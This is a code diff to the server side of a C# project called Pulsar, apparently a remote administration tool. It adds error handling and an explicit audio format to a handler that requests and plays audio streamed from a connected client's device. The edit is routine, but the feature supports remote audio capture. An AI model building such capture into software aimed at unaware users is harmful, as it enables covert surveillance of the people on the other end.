@@ -1,7 +1,7 @@
 ﻿using NAudio.Wave;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Audio;
-using Pulsar.Common.Messages.other;
+using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using Pulsar.Server.Networking;
 using System;
@@ -112,12 +112,38 @@ namespace Pulsar.Server.Messages
         {
             lock (_syncLock)
             {
-                IsStarted = true;
-                _provider = new BufferedWaveProvider(new WaveFormat());
-                _audioStream = new WaveOut();
-                _audioStream.Init(_provider);
-                _audioStream.Play();
-                _client.Send(new GetOutput { CreateNew = true, DeviceIndex = device, Bitrate = _bitrate });
+                try
+                {
+                    IsStarted = true;
+                    WaveFormat waveFormat = new WaveFormat(_bitrate, 2); // 2 channels (stereo) as default
+                    _provider = new BufferedWaveProvider(waveFormat);
+                    _audioStream = new WaveOut();
+                    _audioStream.Init(_provider);
+                    _audioStream.Play();
+                    _client.Send(new GetOutput { CreateNew = true, DeviceIndex = device, Bitrate = _bitrate });
+                }
+                catch (NAudio.MmException ex)
+                {
+                    // Handle the exception gracefully
+                    IsStarted = false;
+                    _provider = null;
+                    _audioStream = null;
+                    System.Windows.Forms.MessageBox.Show($"Error initializing audio output device: {ex.Message}", 
+                        "Audio Error", 
+                        System.Windows.Forms.MessageBoxButtons.OK, 
+                        System.Windows.Forms.MessageBoxIcon.Error);
+                }
+                catch (Exception ex)
+                {
+                    // Handle any other unexpected exceptions
+                    IsStarted = false;
+                    _provider = null;
+                    _audioStream = null;
+                    System.Windows.Forms.MessageBox.Show($"An unexpected error occurred: {ex.Message}",
+                        "Audio Error",
+                        System.Windows.Forms.MessageBoxButtons.OK,
+                        System.Windows.Forms.MessageBoxIcon.Error);
+                }
             }
         }
 
